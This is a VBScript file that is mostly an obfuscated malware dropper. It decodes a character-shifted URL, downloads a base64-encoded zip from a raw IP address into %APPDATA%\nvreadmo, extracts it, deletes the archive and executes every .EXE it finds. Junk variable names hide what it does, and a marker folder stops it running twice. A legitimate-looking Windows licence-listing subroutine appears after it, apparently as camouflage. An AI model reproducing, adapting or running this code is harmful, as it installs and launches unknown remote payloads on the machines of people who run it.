Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4 
dim vbdfhjjnprt,bgilnprtvej,vzbaceegiln,cegillnprtt
dim  lnprttvegii,Clqtaccbdgillnprttvegg,SEUZP
dim  fhhjmprrvvz,mqXFFRJUWm
dim  prttveggllo,cegilnnprtv,cbdfhjmmoqsudd
dim  nprtveggllo,tvvegillpps,OBJbddgilnprrtvzzacbdd
dim  llnpssuxyybaccegiilnnprruddfhjjmooqsuu,egiilnppuaa,fhjjmoqsvzz
Function Jkdkdkd(G1g)
For lnprttvegii = 1 To Len(G1g)
egiilnppuaa = Mid(G1g, lnprttvegii, 1)
egiilnppuaa = Chr(Asc(egiilnppuaa)+ 6)
nprtveggllo = nprtveggllo + egiilnppuaa
Next
Jkdkdkd = nprtveggllo
End Function 
Function rtvvegiinnpruuaccegg()
Dim ClqtaccbdgillnprttveggLM,jxtsuuzacbbdfhhjmo,jrtzaacbdtvvegimmw,Coltddfhlnnprtvvbdffh
Set ClqtaccbdgillnprttveggLM = WScript.CreateObject( "WScript.Shell" )
Set jrtzaacbdtvvegimmw = CreateObject( "Scripting.FileSystemObject" )
Set jxtsuuzacbbdfhhjmo = jrtzaacbdtvvegimmw.GetFolder(cegilnnprtv)
Set Coltddfhlnnprtvvbdffh = jxtsuuzacbbdfhhjmo.Files
For Each Coltddfhlnnprtvvbdffh in Coltddfhlnnprtvvbdffh
If UCase(jrtzaacbdtvvegimmw.GetExtensionName(Coltddfhlnnprtvvbdffh.name)) = "EXE" Then
ClqtaccbdgillnprttveggLM.Exec(cegilnnprtv & "\" & Coltddfhlnnprtvvbdffh.Name)
End If
Next
End Function
fhhjmprrvvz     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)\a_abf^q(cmi")
Set OBJbddgilnprrtvzzacbdd = CreateObject( "WScript.Shell" )    
cbdfhjmmoqsudd = OBJbddgilnprrtvzzacbdd.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
cegillnprtt = "A99449C3092CE70964CE715CF7BB75B.zip"
Function zzacceegilnnprttvegg()
SET bgilnprtvej = CREATEOBJECT("Scripting.FileSystemObject")
IF bgilnprtvej.FolderExists(cbdfhjmmoqsudd + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF bgilnprtvej.FolderExists(vzbaceegiln) = FALSE THEN
bgilnprtvej.CreateFolder vzbaceegiln
bgilnprtvej.CreateFolder OBJbddgilnprrtvzzacbdd.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function ggilnprrvvegiilooqsu()
DIM jrtzaacbdtvvegimmxsd
Set jrtzaacbdtvvegimmxsd = Createobject("Scripting.FileSystemObject")
jrtzaacbdtvvegimmxsd.DeleteFile cegilnnprtv & "\" & cegillnprtt
End Function
cegilnnprtv = cbdfhjmmoqsudd + "\nvreadmo"
uuaddfhjmmoqqsuuxybbaccfhjjmoo
vzbaceegiln = cegilnnprtv
zzacceegilnnprttvegg
hhjmprrtveggilnnprrt
WScript.Sleep 10103
jmoqsuuxybaaceegimmo
WScript.Sleep 5110
ggilnprrvvegiilooqsu
rtvvegiinnpruuaccegg
Function uuaddfhjmmoqqsuuxybbaccfhjjmoo()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(cegilnnprtv )) Then
WScript.Quit()
End If 
End Function   
Function hhjmprrtveggilnnprrt()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", fhhjmprrvvz, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile cegilnnprtv & "\" & cegillnprtt, adSaveCreateOverWrite
End if
End Function
prttveggllo = "tvvegillpps"
Function jmoqsuuxybaaceegimmo()
set Clqtaccbdgillnprttvegg = CreateObject("Shell.Application")
set SEUZP=Clqtaccbdgillnprttvegg.NameSpace(cegilnnprtv & "\" & cegillnprtt).items
Clqtaccbdgillnprttvegg.NameSpace(cegilnnprtv & "\").CopyHere(SEUZP), 4
Set Clqtaccbdgillnprttvegg = Nothing
End Function 

Private Sub TkaListILs
    Dim objLicense
    Dim strHeader
    Dim strError
    Dim strGuids
    Dim arrGuids
    Dim nListed

    Dim objWmiDate

    LineOut GetResource("L_MsgTkaLicenses")
    LineOut ""

    Set objWmiDate = CreateObject("WBemScripting.SWbemDateTime")

    nListed = 0
    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)

        strHeader = GetResource("L_MsgTkaLicenseHeader")
        strHeader = Replace(strHeader, "%ILID%" , objLicense.ILID )
        strHeader = Replace(strHeader, "%ILVID%", objLicense.ILVID)
        LineOut strHeader

        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILID"), "%ILID%", objLicense.ILID)
        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILVID"), "%ILVID%", objLicense.ILVID)

        If Not IsNull(objLicense.ExpirationDate) Then

            objWmiDate.Value = objLicense.ExpirationDate

            If (objWmiDate.GetFileTime(false) <> 0) Then
                LineOut "    " & Replace(GetResource("L_MsgTkaLicenseExpiration"), "%TODATE%", objWmiDate.GetVarDate)
            End If

        End If

        If Not IsNull(objLicense.AdditionalInfo) Then
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAdditionalInfo"), "%MOREINFO%", objLicense.AdditionalInfo)
        End If

        If Not IsNull(objLicense.AuthorizationStatus) And _
           objLicense.AuthorizationStatus <> 0 _
        Then
            strError = CStr(Hex(objLicense.AuthorizationStatus))
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAuthZStatus"), "%ERRCODE%", strError)
        Else
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseDescr"), "%DESC%", objLicense.Description)
        End If

        LineOut ""
        nListed = nListed + 1
    Next

    if 0 = nListed Then
        LineOut GetResource("L_MsgTkaLicenseNone")
    End If
End Sub